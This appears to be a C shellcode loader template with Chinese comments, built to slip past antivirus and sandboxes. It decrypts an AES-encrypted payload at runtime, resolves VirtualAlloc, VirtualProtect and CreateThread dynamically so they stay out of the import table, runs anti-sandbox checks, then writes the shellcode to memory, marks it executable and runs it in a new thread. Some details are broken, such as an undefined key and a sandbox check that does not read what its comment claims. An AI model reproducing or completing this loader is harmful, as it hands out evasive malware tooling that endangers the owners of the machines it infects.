unsigned char payload[/* 加密后长度 */] = { /* AES-256-CBC 密文 */ };

// 动态解析函数，避免导入表里出现 VirtualAllocEx / CreateThread 等敏感 API
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL   (WINAPI *pVirtualProtect)(LPVOID,SIZE_T,DWORD,PDWORD);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE,DWORD);

static void* gptr(const char* dll, const char* fn) {
    HMODULE h = GetModuleHandleA(dll);
    if (!h) h = LoadLibraryA(dll);
    return (void*)GetProcAddress(h, fn);
}

// TODO: 这里调用你自己的 AES-256-CBC 解密（贴一个精简实现即可，几十行）
extern int aes_decrypt(unsigned char* key, unsigned char* in, int inlen, unsigned char* out);

int main(void) {
    // 1) 反沙箱：检查鼠标/机器名/CPU 核数（示例）
    if (GetSystemMetrics(SM_REMOTESESSION)) return 0;
    if (*(unsigned int*)0x7FFE0000 < 2) return 0; // KUSER_SHARED_DATA 里 NumberOfProcessors

    // 2) 解密
    unsigned char buf[0x20000] = {0};
    int len = aes_decrypt(key, payload, sizeof(payload), buf);
    if (len <= 0) return 0;

    // 3) 申请 RW 页 -> 解密后的 shellcode 写入 -> 改 RWX
    pVirtualAlloc va = (pVirtualAlloc)gptr("kernel32.dll", "VirtualAlloc");
    pVirtualProtect vp = (pVirtualProtect)gptr("kernel32.dll", "VirtualProtect");
    pCreateThread ct = (pCreateThread)gptr("kernel32.dll", "CreateThread");

    LPVOID mem = va(NULL, (SIZE_T)len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 0;
    for (int i = 0; i < len; i++) ((unsigned char*)mem)[i] = buf[i];
    DWORD old;
    vp(mem, (SIZE_T)len, PAGE_EXECUTE_READ, &old);   // 不要直接 PAGE_EXECUTE_READWRITE

    HANDLE t = ct(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(t, INFINITE);
    return 0;
}
```

